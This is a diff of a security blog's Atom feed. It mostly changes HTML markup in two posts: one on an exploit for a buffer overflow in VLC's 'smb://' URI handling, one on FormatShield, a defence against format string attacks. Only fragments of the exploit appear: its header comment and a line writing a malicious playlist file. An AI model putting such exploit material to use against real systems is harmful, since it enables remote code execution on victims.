     &lt;p&gt;A stack-based buffer overflow exists in the &lt;code&gt;Win32AddConnection&lt;/code&gt; function in &lt;code&gt;modules/access/smb.c&lt;/code&gt; in VideoLAN VLC media player 0.9.9, when running on Microsoft Windows, that allows remote attackers to execute arbitrary code via a long smb URI in a playlist file.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cm&quot;&gt;/* VLC Media Player &amp;#39;smb://&amp;#39; URI Handling Remote Buffer Overflow Vulnerability Exploit&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cm&quot;&gt;/* VLC Media Player &amp;#39;smb://&amp;#39; URI Handling Remote Buffer Overflow Vulnerability Exploit&lt;/span&gt;
 &lt;span class=&quot;cm&quot;&gt;* Reference: http://www.securityfocus.com/bid/35500&lt;/span&gt;
 &lt;span class=&quot;cm&quot;&gt;*&lt;/span&gt;
 &lt;span class=&quot;cm&quot;&gt;* Tested on VLC media player 0.8.6f on WinXP SP3&lt;/span&gt;
@@ -731,13 +748,15 @@ Bits 32-28    &lt;span class=&quot;m&quot;&gt;27&lt;/span&gt;       26-17      1
     &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;[*] Exploit file written to sploit.xspf&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  
     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
-    &lt;p&gt;&lt;a href=&quot;/posts/vlc-media-player-smb-uri-handling-remote-buffer-overflow-vulnerability-exploit.html&quot;&gt;VLC Media Player &#39;smb://&#39; URI Handling Remote Buffer Overflow Vulnerability Exploit&lt;/a&gt; was originally published by Pankaj Kohli at &lt;a href=&quot;&quot;&gt;Pankaj Kohli&lt;/a&gt; on August 07, 2009.&lt;/p&gt;
+    &lt;p&gt;&lt;a href=&quot;/posts/vlc-media-player-smb-uri-handling-remote-buffer-overflow-vulnerability-exploit.html&quot;&gt;VLC Media Player 'smb://' URI Handling Remote Buffer Overflow Vulnerability Exploit&lt;/a&gt; was originally published by Pankaj Kohli at &lt;a href=&quot;&quot;&gt;Pankaj Kohli&lt;/a&gt; on August 07, 2009.&lt;/p&gt;
   </content>
 </entry>
 
+
+  
 
 <entry>
   <title type="html"><![CDATA[FormatShield: A tool to defend against format string attacks]]></title>
@@ -755,7 +774,7 @@ Bits 32-28    &lt;span class=&quot;m&quot;&gt;27&lt;/span&gt;       26-17      1
 
 &lt;p&gt;FormatShield provides wrappers for the following libc functions:&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...)&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...)&lt;/span&gt;
 &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...)&lt;/span&gt;
 &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...)&lt;/span&gt;
 &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...)&lt;/span&gt;
@@ -764,7 +783,7 @@ Bits 32-28    &lt;span class=&quot;m&quot;&gt;27&lt;/span&gt;       26-17      1
 &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vsprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;va_list&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vsnprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;va_list&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;syslog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priority&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...)&lt;/span&gt;
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vsyslog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priority&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;va_list&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vsyslog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priority&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;va_list&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;On detecting an attack, the victim process is killed and a log is written to syslog. More details about the inner working of FormatShield are available in the &lt;a href=&quot;/assets/files/formatshield-acisp08.pdf&quot;&gt;research paper&lt;/a&gt;.&lt;/p&gt;
 
